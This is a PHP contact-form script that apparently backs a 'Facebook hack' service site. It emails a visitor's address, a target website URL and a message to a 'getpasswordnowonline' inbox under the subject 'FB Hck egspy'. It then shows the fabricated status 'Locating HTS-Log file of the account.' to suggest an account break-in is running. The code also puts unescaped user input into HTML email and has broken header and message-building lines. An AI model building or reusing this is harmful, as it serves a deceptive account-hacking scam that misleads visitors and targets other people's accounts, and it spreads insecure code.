<?php

	error_reporting(0);
	// Blocking direct access.
	if(!$_POST) die();

	// Dynamic Values
	$email_to = "info@getpasswordnowonline.com";
	$email_subject = "FB Hck egspy";
	$score = "";
	
    if(!isset($_POST['formEmail']) || !isset($_POST['formweburl']) || !isset($_POST['formmessage'])) {
		echo "<p style='color:red;'>Please complete the fields and submit it again.</p>"; 
		//var_dump($_POST);
    }else{
		$formEmail = $_POST['formEmail'];
		$formweburl = $_POST['formweburl'];
		$formmessage = $_POST['formmessage'];
		
		
		$error_message = "";
		$string_exp = "/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/";

		if(!($formEmail)){
		    $error_message= '<p style="color:red;">Please fill all fields</p>';
		}

		if($formEmail){
		 	if(strlen($formEmail)>50){
				$error_message.= '<p style="color:red;">Maximum allowed characters for email is 50</p>';
			}else{
		   		if(filter_var($formEmail, FILTER_VALIDATE_EMAIL) === false) 
				$error_message .= '<p style="color:red;">The Email you entered is not valid.</p>';
		  	}
		}


		if(!($formweburl )){
			$error_message= '<p style="color:red;">Please fill all fields</p>';
		}
	
		if(!($formmessage)){
		    $error_message= '<p style="color:red;">Please fill all fields</p>';
		}
		

		if(strlen($error_message) > 0) {
			  echo $error_message;
		}else{
			
			// Always set content-type when sending HTML email
			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			$headers .= 'From: <info@egspy.com>' . "\r\n";
			$headers .= 'Reply-To: info@egapy.com\r\n';
			
			$email_message ="<html><body><h1>".$email_subject."</h1><br/>";
			$email_message ="<table border='1' cellpadding='5'>";
			$email_message .= "<tr><td>Email Address: </td><td>".$formEmail."</td></tr>";			
			$email_message .= "<tr><td>Website URL: </td><td>".$formweburl."</td></tr>";						
			$email_message .= "<tr><td>Message: </td><td>".$formmessage."</td></tr>";			
			$email_message .= "</table></body></html>";

			if(mail($email_to,$email_subject,$email_message,$headers)){
				echo "<p style='color:green; text-align:center'>Locating HTS-Log file of the account.</p>";
			} else {
				echo "Failed to send your message. Please try again";	
			}
		}
	}	
	exit;
?>